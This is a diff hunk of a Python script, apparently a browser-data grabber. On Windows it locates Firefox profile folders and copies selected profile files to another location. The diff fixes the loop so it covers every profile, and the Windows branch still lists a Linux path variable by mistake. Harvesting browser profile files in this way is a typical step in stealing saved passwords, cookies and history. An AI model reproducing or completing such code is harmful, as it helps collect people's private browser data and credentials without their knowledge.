@@ -24,14 +24,14 @@ print("[*] Detecting Operating System: " + os.name)
 if os.name == 'nt':
     windows_path = os.path.normpath(r"%s\AppData\Roaming\Mozilla\Firefox\Profiles"%(os.environ['USERPROFILE']))
     windows_exist = Path(windows_path) #check to see if firefox exists on a windows system
-    if windows_exist.is_dir():
+    if windows_exist.is_dir(): #checks to see if firefox path exists on windows
         files = os.listdir(linux_path) #add folders to list
         for i in files:
             if len(i) > 20:
-                store = i #add folders to list
+                store = i #add folders to list if length is > than 20
                 #loop over files and check if path exists then only try to copy file
                 for x in file_list:
-                    file_path = os.path.normpath(r"{}\AppData\Roaming\Mozilla\Firefox\Profiles\{}\{}").format(os.environ['USERPROFILE'],files[0],x)
+                    file_path = os.path.normpath(r"{}\AppData\Roaming\Mozilla\Firefox\Profiles\{}\{}").format(os.environ['USERPROFILE'],i,x)
                     file_exist = Path(file_path)
                     if file_exist.is_file():
                         shutil.copy(file_path,dst)
